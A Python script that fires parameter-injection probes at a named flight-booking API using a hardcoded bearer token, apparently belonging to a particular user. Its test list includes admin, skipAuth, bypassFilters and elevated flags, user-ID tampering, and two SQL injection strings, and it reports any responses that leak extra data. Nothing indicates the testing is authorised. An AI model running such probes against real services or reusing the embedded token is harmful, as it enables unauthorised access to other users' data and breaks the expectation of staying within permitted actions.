#!/usr/bin/env python3
"""
V3 Parameter Injection Testing

Tests if special parameters reveal additional data or functionality
"""

import requests
import json

API_URL = "https://vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"

def get_flights_v3(params=""):
    """Get flights from v3 API with parameters"""
    headers = {"Authorization": f"Bearer {SAMEER_TOKEN}"}
    url = f"{API_URL}/v3/flight?includeExpired=false&nearMe=false{params}"

    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if isinstance(data, dict):
                return {
                    "status": r.status_code,
                    "data_count": len(data.get('data', [])),
                    "available_count": data.get('availableCount'),
                    "near_me_count": data.get('nearMeCount'),
                    "keys": list(data.keys()),
                    "sample": json.dumps(data, indent=2)[:500]
                }
            return {
                "status": r.status_code,
                "data_count": len(data) if isinstance(data, list) else 0,
                "response": str(data)[:500]
            }
        else:
            return {
                "status": r.status_code,
                "error": r.text[:200]
            }
    except Exception as e:
        return {
            "status": "ERROR",
            "error": str(e)
        }

def main():
    print("="*80)
    print("V3 PARAMETER INJECTION TESTING")
    print("="*80)
    print()

    # Get baseline
    print("Step 1: Getting baseline (no extra parameters)...")
    baseline = get_flights_v3()
    print(f"Status: {baseline.get('status')}")
    print(f"Flight count: {baseline.get('data_count')}")
    print(f"Available count: {baseline.get('available_count')}")
    print(f"Near me count: {baseline.get('near_me_count')}")
    print()

    baseline_count = baseline.get('data_count', 0)

    # Test parameters
    print("="*80)
    print("TESTING PARAMETERS")
    print("="*80)
    print()

    test_cases = [
        # Boolean toggles
        ("&includeExpired=true", "Include expired flights"),
        ("&nearMe=true", "Near me filter"),
        ("&showAll=true", "Show all flights"),
        ("&admin=true", "Admin flag"),
        ("&debug=true", "Debug mode"),
        ("&internal=true", "Internal mode"),

        # Limits and filters
        ("&limit=9999", "High limit"),
        ("&offset=0", "Offset parameter"),
        ("&includeDeleted=true", "Include deleted"),
        ("&includePrivate=true", "Include private"),
        ("&includeClosed=true", "Include closed"),

        # Permission escalation
        ("&bypassFilters=true", "Bypass filters"),
        ("&skipAuth=true", "Skip authorization"),
        ("&elevated=true", "Elevated privileges"),

        # User/ID parameters
        ("&userId=123", "Specific user ID"),
        ("&userId=" + str(20254), "Own user ID"),
        ("&flightId=8800", "Specific flight ID"),

        # Data exposure
        ("&includeDetails=true", "Include details"),
        ("&verbose=true", "Verbose mode"),
        ("&raw=true", "Raw data"),

        # SQL injection attempts
        ("&includeExpired=false' OR '1'='1", "SQL injection 1"),
        ("&userId=1 OR 1=1--", "SQL injection 2"),

        # Format parameters
        ("&format=json", "JSON format"),
        ("&format=xml", "XML format"),
        ("&pretty=true", "Pretty print"),
    ]

    interesting = []
    warnings = []

    for param, description in test_cases:
        result = get_flights_v3(param)
        status = result.get('status')
        count = result.get('data_count', 0)

        print(f"Testing: {description}")
        print(f"  Parameter: {param}")
        print(f"  Status: {status}")

        if status == 200:
            print(f"  Flight count: {count}")

            if count != baseline_count:
                print(f"  ⚠️  COUNT CHANGED! Baseline: {baseline_count}, New: {count}")
                interesting.append({
                    "param": param,
                    "description": description,
                    "baseline_count": baseline_count,
                    "new_count": count,
                    "difference": count - baseline_count
                })
                warnings.append(description)
            else:
                print(f"  ✅ No change in count")

            # Check for new keys in response
            new_keys = set(result.get('keys', [])) - set(baseline.get('keys', []))
            if new_keys:
                print(f"  ⚠️  NEW KEYS IN RESPONSE: {new_keys}")
                interesting.append({
                    "param": param,
                    "description": description,
                    "finding": f"New response keys: {new_keys}"
                })
                warnings.append(description)
        elif status != 400:
            print(f"  ℹ️  Unexpected status: {status}")
            if status == 500:
                print(f"  🚨 SERVER ERROR - Parameter may have caused crash!")
                warnings.append(f"{description} (500 error)")

        print()

    # Summary
    print("="*80)
    print("PARAMETER INJECTION RESULTS")
    print("="*80)
    print()

    if interesting:
        print(f"⚠️  Found {len(interesting)} parameters that change behavior:")
        print()
        for item in interesting:
            print(f"  Parameter: {item.get('param')}")
            print(f"  Description: {item.get('description')}")
            if 'difference' in item:
                print(f"  Flight count change: {item['baseline_count']} → {item['new_count']} ({item['difference']:+d})")
            if 'finding' in item:
                print(f"  Finding: {item['finding']}")
            print()

        print("Security Assessment: CONCERNING")
        print("  - Special parameters reveal additional data")
        print("  - Possible information disclosure vulnerability")
        print("  - May expose flights user shouldn't see")
    else:
        print("✅ No parameter injection vectors found")
        print()
        print("Security Assessment: GOOD")
        print("  - Parameters are properly validated")
        print("  - No information disclosure detected")
        print("  - Filters work as expected")

    print()

    # Save results
    if interesting:
        output_file = "/home/user/vaunt/api_testing/parameter_injection_findings.json"
        with open(output_file, 'w') as f:
            json.dump(interesting, f, indent=2)
        print(f"✅ Findings saved to: {output_file}")
        print()

    print("="*80)
    print("SPECIFIC FINDINGS")
    print("="*80)
    print()

    # Test includeExpired specifically
    print("Testing includeExpired=true in detail...")
    expired_result = get_flights_v3("&includeExpired=true")
    expired_count = expired_result.get('data_count', 0)

    print(f"  Normal flights: {baseline_count}")
    print(f"  With expired: {expired_count}")
    print(f"  Difference: {expired_count - baseline_count:+d}")

    if expired_count > baseline_count:
        print(f"  ✅ includeExpired works as expected (shows more flights)")
    elif expired_count == baseline_count:
        print(f"  ℹ️  includeExpired has no effect (no expired flights or already included)")
    else:
        print(f"  ⚠️  includeExpired reduced count (unexpected)")

    print()
    print("="*80)

if __name__ == "__main__":
    main()
